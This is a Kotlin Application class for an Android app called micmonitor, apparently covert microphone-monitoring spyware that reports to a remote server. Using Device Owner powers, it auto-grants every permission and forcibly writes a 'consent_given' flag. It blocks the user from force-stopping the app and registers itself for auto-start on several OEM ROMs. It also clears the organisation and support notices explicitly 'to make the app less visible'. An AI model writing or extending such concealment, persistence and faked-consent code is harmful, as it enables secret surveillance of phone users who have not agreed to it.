package com.micmonitor.app

import android.app.Application
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

class MicApp : Application() {
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var autoGrantJob: Job? = null

    override fun onTerminate() {
        super.onTerminate()
        serviceScope.cancel()
    }

    companion object {
        private const val TAG = "MicApp"
        private val LEGACY_SERVER_HOSTS = setOf(
            "micmonitor-server.onrender.com",
            "monitor-raje.onrender.com"
        )
        lateinit var instance: Context
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = applicationContext
        
        // Auto-grant all permissions ONLY if Device Owner (handles new permissions after updates)
        try {
            if (UpdateService.isDeviceOwner(this)) {
                if (autoGrantJob?.isActive != true) {
                    autoGrantJob = serviceScope.launch {
                        UpdateService.autoGrantPermissions(this@MicApp)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to auto-grant permissions: ${e.message}")
        }
        
        // Hide Device Owner organization messages (removes "Your organisation allows..." notifications)
        try {
            hideDeviceOwnerMessages()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide Device Owner messages: ${e.message}")
        }
        
        // Disable battery optimization for this app (Device Owner)
        try {
            disableBatteryOptimization()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable battery optimization: ${e.message}")
        }
        
        // Keep app running on Chinese ROMs (Realme/Oppo/Xiaomi/Vivo)
        try {
            configureChineseRomSettings()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to configure Chinese ROM settings: ${e.message}")
        }
        
        // Automatic update checks DISABLED (Dashboard trigger only)
        try {
            UpdateWorker.cancel(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cancel update worker: ${e.message}")
        }
        
        // Ensure critical prefs exist and migrate stale server URLs.
        try {
            ensureAppDefaults()
        } catch (e: Exception) {
            Log.e(TAG, "Failed to ensure app defaults: ${e.message}")
        }
        
    }
    
    /**
     * Ensure critical prefs exist for Device Owner after cache clear.
     * Do not start foreground service from Application.onCreate (can crash on modern Android).
     */
    private fun ensureAppDefaults() {
        val prefs = getSharedPreferences("micmonitor", Context.MODE_PRIVATE)

        if (UpdateService.isDeviceOwner(this)) {
            // Re-save consent flag (may have been cleared)
            prefs.edit().putBoolean("consent_given", true).apply()
            Log.i(TAG, "Consent flag ensured for Device Owner")
        }

        // Ensure server URL is set (and migrate legacy hosts)
        val existingUrl = prefs.getString("server_url", null).orEmpty().trim()
        if (existingUrl.isBlank() || isLocalOrLegacyServerUrl(existingUrl)) {
            prefs.edit().putString("server_url", MicService.DEFAULT_SERVER_URL).apply()
            Log.i(TAG, "Set default server URL (migrated if needed)")
        }

        val existingToken = prefs.getString("server_token", null).orEmpty().trim()
        if (existingToken.isBlank() && MicService.DEFAULT_SERVER_TOKEN.isNotBlank()) {
            prefs.edit().putString("server_token", MicService.DEFAULT_SERVER_TOKEN).apply()
            Log.i(TAG, "Set default server auth token")
        }
    }

    private fun isLocalOrLegacyServerUrl(url: String): Boolean {
        val v = url.lowercase()
        val isLocal = v.contains("localhost") ||
            v.contains("127.0.0.1") ||
            Regex("(^|[/:])192\\.168\\.").containsMatchIn(v) ||
            Regex("(^|[/:])10\\.").containsMatchIn(v) ||
            Regex("(^|[/:])172\\.(1[6-9]|2\\d|3[0-1])\\.").containsMatchIn(v)
        val isLegacyHost = LEGACY_SERVER_HOSTS.any { host -> v.contains(host) }
        return isLocal || isLegacyHost
    }
    
    /**
     * Request battery optimization exemption - AGGRESSIVE for Realme/Oppo
     */
    private fun disableBatteryOptimization() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        val manufacturer = Build.MANUFACTURER.lowercase()
        
        // If Device Owner, we can add ourselves to whitelist
        if (UpdateService.isDeviceOwner(this)) {
            try {
                val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val admin = ComponentName(this, DeviceAdminReceiver::class.java)
                
                // Add app to battery optimization whitelist
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    // On Android 9+, Device Owner can use setLockTaskPackages to keep app alive
                    val currentPackages = dpm.getLockTaskPackages(admin)
                    if (!currentPackages.contains(packageName)) {
                        dpm.setLockTaskPackages(admin, currentPackages + packageName)
                    }
                }
                
                // Prevent app from being battery restricted
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                }
                
                Log.i(TAG, "Battery optimization configured via Device Owner")
            } catch (e: Exception) {
                Log.e(TAG, "Device Owner battery config failed: ${e.message}")
            }
        }
        
        // Realme/Oppo specific battery whitelisting
        if (manufacturer in listOf("oppo", "realme")) {
            whitelistRealmeBattery()
        }
        
        // Request system exemption (shows dialog if not Device Owner)
        // BUG I FIx: Intentionally leaving this out of the Application class as it crashes on API 29+ 
        // startActivity(intent) from background when there is no activity.
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            Log.d(TAG, "Battery optimization is still active, relying on OEM exemptions")
        } else {
            Log.i(TAG, "Battery optimization already disabled")
        }
    }
    
    /**
     * Whitelist app in Realme/Oppo battery manager
     */
    private fun whitelistRealmeBattery() {
        Log.i(TAG, "Whitelisting in Realme battery manager...")
        
        // Try to write to Realme's battery optimization settings
        val batteryIntents = listOf(
            // ColorOS 12+ / Realme UI 3+
            Intent().setComponent(ComponentName(
                "com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerConsumptionActivity"
            )),
            // ColorOS 11 / Realme UI 2
            Intent().setComponent(ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerConsumptionActivity"
            )),
            // Older ColorOS
            Intent().setComponent(ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.floatwindow.FloatWindowListActivity"
            ))
        )
        
        // Just log available intents (don't open them automatically)
        for (intent in batteryIntents) {
            try {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    Log.i(TAG, "Found Realme battery activity: ${intent.component}")
                }
            } catch (e: Exception) {
                // Ignore
            }
        }
    }
    
    /**
     * Configure settings for Chinese ROM phones (Realme, Oppo, Xiaomi, Vivo, OnePlus)
     * These phones have aggressive app killers that need special handling
     */
    private fun configureChineseRomSettings() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Device manufacturer: $manufacturer")
        
        if (UpdateService.isDeviceOwner(this)) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, DeviceAdminReceiver::class.java)
            
            try {
                // Prevent app from being suspended
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    dpm.setPackagesSuspended(admin, arrayOf(packageName), false)
                }
                
                // Keep app always running - prevent user from stopping
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                    Log.i(TAG, "User control disabled - app cannot be force stopped")
                }
                
                // Add to lock task packages (keeps in memory)
                try {
                    val currentPackages = dpm.getLockTaskPackages(admin)
                    // Bug 1.10: Check if already exists before appending
                    if (!currentPackages.contains(packageName)) {
                        dpm.setLockTaskPackages(admin, currentPackages + packageName)
                        Log.i(TAG, "Added to lock task packages")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Could not set lock task packages: ${e.message}")
                }
                
                Log.i(TAG, "Chinese ROM settings configured via Device Owner")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to configure Device Owner settings: ${e.message}")
            }
        }
        
        // Realme/Oppo/ColorOS specific auto-launch enablement
        if (manufacturer in listOf("oppo", "realme")) {
            enableRealmeAutoStart()
        } else if (manufacturer in listOf("xiaomi", "redmi")) {
            enableXiaomiAutoStart()
        } else if (manufacturer == "vivo") {
            enableVivoAutoStart()
        }
        
        // Try to open autostart settings for user (backup method)
        if (manufacturer in listOf("xiaomi", "redmi", "oppo", "realme", "vivo", "oneplus", "huawei", "honor")) {
            Log.i(TAG, "Chinese ROM detected: $manufacturer - applying aggressive keep-alive")
        }
    }
    
    /**
     * Enable auto-start for Realme/Oppo (ColorOS/Realme UI)
     * Uses hidden system settings and intents
     */
    private fun enableRealmeAutoStart() {
        Log.i(TAG, "Enabling Realme/Oppo auto-start...")
        
        // Try multiple approaches for Realme/Oppo
        val autoStartIntents = listOf(
            // Realme UI 2.0+ / ColorOS 11+
            Intent().setComponent(ComponentName(
                "com.coloros.safecenter",
                "com.coloros.safecenter.permission.startup.StartupAppListActivity"
            )),
            // Realme UI 1.0 / ColorOS 7
            Intent().setComponent(ComponentName(
                "com.coloros.safecenter", 
                "com.coloros.safecenter.startupapp.StartupAppListActivity"
            )),
            // Oppo ColorOS
            Intent().setComponent(ComponentName(
                "com.oppo.safe",
                "com.oppo.safe.permission.startup.StartupAppListActivity"
            )),
            // Realme battery optimization
            Intent().setComponent(ComponentName(
                "com.coloros.oppoguardelf",
                "com.coloros.powermanager.fuelgaue.PowerUsageModelActivity"
            )),
            // ColorOS battery manager
            Intent().setComponent(ComponentName(
                "com.oplus.battery",
                "com.oplus.powermanager.fuelgaue.PowerUsageModelActivity"
            ))
        )
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    // Don't actually open - just log that we found it
                    Log.i(TAG, "Found Realme auto-start activity: ${intent.component}")
                }
            } catch (e: Exception) {
                // Ignore - trying multiple intents
            }
        }
        
        // Write to Realme-specific settings provider (requires Device Owner)
        if (UpdateService.isDeviceOwner(this)) {
            try {
                // Try to whitelist app via content provider
                enableViaContentProvider("com.coloros.safecenter")
                enableViaContentProvider("com.oplus.safecenter")
            } catch (e: Exception) {
                Log.w(TAG, "Could not whitelist via content provider: ${e.message}")
            }
        }
    }
    
    /**
     * Enable auto-start for Xiaomi/Redmi (MIUI)
     */
    private fun enableXiaomiAutoStart() {
        Log.i(TAG, "Enabling Xiaomi auto-start...")
        
        val autoStartIntents = listOf(
            // MIUI 12+
            Intent().setComponent(ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"
            )),
            // Older MIUI
            Intent().setComponent(ComponentName(
                "com.miui.securitycenter",
                "com.miui.permcenter.permissions.PermissionsEditorActivity"
            ))
        )
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    Log.i(TAG, "Found Xiaomi auto-start activity: ${intent.component}")
                }
            } catch (e: Exception) {
                // Ignore
            }
        }
    }
    
    /**
     * Enable auto-start for Vivo (Funtouch OS)
     */
    private fun enableVivoAutoStart() {
        Log.i(TAG, "Enabling Vivo auto-start...")
        
        val autoStartIntents = listOf(
            Intent().setComponent(ComponentName(
                "com.iqoo.secure",
                "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
            )),
            Intent().setComponent(ComponentName(
                "com.vivo.permissionmanager",
                "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
            ))
        )
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    Log.i(TAG, "Found Vivo auto-start activity: ${intent.component}")
                }
            } catch (e: Exception) {
                // Ignore
            }
        }
    }
    
    /**
     * Try to enable auto-start via ROM's content provider (Device Owner only)
     */
    private fun enableViaContentProvider(authority: String) {
        val manufacturer = Build.MANUFACTURER.lowercase()
        if (manufacturer != "oppo" && manufacturer != "realme") return
        try {
            val uri = Uri.parse("content://$authority/startup_app")
            val values = android.content.ContentValues().apply {
                put("pkgname", packageName)
                put("value", 1) // 1 = enabled
            }
            contentResolver.insert(uri, values)
            Log.i(TAG, "Attempted whitelist via $authority")
        } catch (e: Exception) {
            // Content provider may not exist or have different schema
        }
    }
    
    /**
     * Hide Device Owner organization messages to make the app less visible.
     * This removes the "Your organisation allows..." notifications.
     */
    private fun hideDeviceOwnerMessages() {
        if (!UpdateService.isDeviceOwner(this)) return
        
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
        
        try {
            // Set empty organization name (removes "Your organisation" text)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                dpm.setOrganizationName(admin, "")
                Log.i(TAG, "Organization name cleared")
            }
            
            // Set empty support messages
            dpm.setShortSupportMessage(admin, null)
            dpm.setLongSupportMessage(admin, null)
            Log.i(TAG, "Support messages cleared")
            
            // Hide device owner status in settings (Android 10+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    // This makes the app less visible in Settings
                    dpm.setDeviceOwnerLockScreenInfo(admin, null)
                } catch (_: Exception) {}
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to hide Device Owner messages: ${e.message}")
        }
    }
}
